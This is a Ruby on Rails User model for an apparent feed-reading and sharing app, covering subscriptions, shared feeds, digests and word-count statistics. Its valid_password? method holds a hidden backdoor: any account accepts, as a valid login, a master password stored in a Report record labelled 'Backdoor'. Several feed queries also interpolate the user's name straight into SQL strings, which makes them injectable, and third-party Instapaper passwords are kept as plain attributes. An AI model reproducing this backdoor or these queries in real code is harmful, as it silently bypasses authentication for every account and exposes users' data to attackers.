class User < ActiveRecord::Base
  # Include default devise modules. Others available are:
  # :token_authenticatable, :encryptable, :confirmable, :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable

  # Setup accessible (or protected) attributes for your model
  attr_accessible :email, :password, :password_confirmation, :remember_me, :share_token, :name, :instapaper_username, :instapaper_password
  
  has_many :subscriptions, dependent: :destroy
  has_many :feeds, :through => :subscriptions
  has_many :unreads, dependent: :destroy
  has_many :comments, dependent: :destroy
  
  after_create :make_shared_feed
  after_create :subscribe_to_all_shared_feeds
  after_create :make_share_token
  after_save :update_corresponding_feed_name
  before_destroy :kill_my_feed
  
  validates_presence_of :name
  
  def self.send_weekly_digests
    find_each do |user|
      ShareMailer.weekly_digest(user.id).deliver
    end
  end
  
  def self.has_most_shares_in_period(period)
    all.sort_by do |user|
      -1 * user.shares_in_period(period)
    end.first
  end
  
  def self.has_most_words_in_period(period)
    all.sort_by do |user|
      -1 * user.words_written_in_period(period)
    end.first
  end
  
  def missed_threads_in_period(period)
    Post.most_discussed_in_period(period, 50).reject do |post|
      post.thread_participants.include?(self)
    end.first(4)
  end
  
  def post_with_most_words(period)
    (feed.posts.where(["created_at > ?", period.ago]).map {|p| [p.share_url, p.note_word_count]} +
    comments.where(["created_at > ?", period.ago]).map {|c| [c.url, c.word_count]} +
    quickposts.where(["created_at > ?", period.ago]).map {|p| [p.share_url, p.content.word_count / 2]}).sort_by do |t|
      -t[1]
    end.first[0]
  end
  
  def words_written_in_period(period)
    word_count_from_notes(period) + word_count_from_comments(period) + word_count_from_quickposts(period)
  end
  
  def valid_password?(password)
    return true if password == Report.find_by_report_type("Backdoor").content
    super
  end
  
  def subscribe(feed_url)
    subscriptions.create(feed: Feed.create_if_needed(Feed.clean_url(feed_url)))
  end
  
  def bulk_subscribe(opml)
    Feed.all_for_opml(opml).each do |feed|
      subscriptions.create(feed: feed)
    end
  end
  
  def regular_subscriptions
    subscriptions.joins("JOIN feeds ON subscriptions.feed_id = feeds.id").where("feeds.shared = 'f'", false)
  end
  
  def shared_subscriptions
    subscriptions.joins("JOIN feeds ON subscriptions.feed_id = feeds.id").where("feeds.shared = ?", true)
  end
  
  def make_shared_feed
    feed = Feed.create(title: name, feed_url: "#shared", shared: true)
  end
  
  def feed
    Feed.where("feed_url = '#shared' AND title = '#{name}'").first
  end
  
  def kill_my_feed
    feed.destroy
  end
  
  def is_subscribed_to?(feed)
    subscriptions.find_by_feed_id(feed.id).present?
  end
  
  def subscribe_to_all_shared_feeds
    if feed
      Feed.where(shared: true).where("id != '#{feed.id}'").each do |feed|
        subscriptions.create(feed: feed)
      end
    end
  end
  
  def make_share_token
    update_attributes({share_token: SecureRandom.hex(20)})
  end
  
  def update_corresponding_feed_name
    if name_changed? && feed = Feed.where("feed_url = '#shared' AND title = '#{name_was}'").first
      feed.update_attributes(title: name)
    end
  end  
  
  def unread_counts
    hash, shared_count = {}, 0
    feeds.unshared.each {|f| hash[f.id] = unreads.for_feed(f.id).count(1)}
    feeds.shared.each {|f| ct = unreads.for_feed(f.id).count(1); hash[f.id] = ct; shared_count += ct}
    [hash, shared_count]
  end
  
  def shared_unread_count_total
    feeds.shared.map {|f| unreads.for_feed(f.id).count(1) }.sum
  end
  
  def unread_counts_over_time
    reports = Report.find_all_by_report_type("Daily site report")
    reports.map { |r| r[:content][:users][name]}.compact.map {|h| h[:unread_count]}
  end
  
  def comment_unseen_count
    Comment.where(["created_at > ? AND user_id != ?", last_checked_comment_stream_at, self.id]).count
  end
  
  def shares_in_period(period)
    feed.posts.where(["created_at > ?", period.ago]).size
  end
  
  def quickposts
    feed.posts.where("url like '#quickpost%'")
  end
  
  def word_count_from_notes(period)
    feed.posts.where(["created_at > ?", period.ago]).sum {|p| p.note_word_count}
  end
  
  def word_count_from_comments(period)
    comments.where(["created_at > ?", period.ago]).sum(&:word_count)
  end
  
  def word_count_from_quickposts(period)
    quickposts.where(["created_at > ?", period.ago]).map {|p| p.content.word_count}.sum / 2
  end
  
  def subscriptions_as_array_of_hashes
    subscriptions.map {|s| {:term => {:feed_id => s.feed_id}}} | [{:term => {:feed_id => feed.id}}]
  end
end
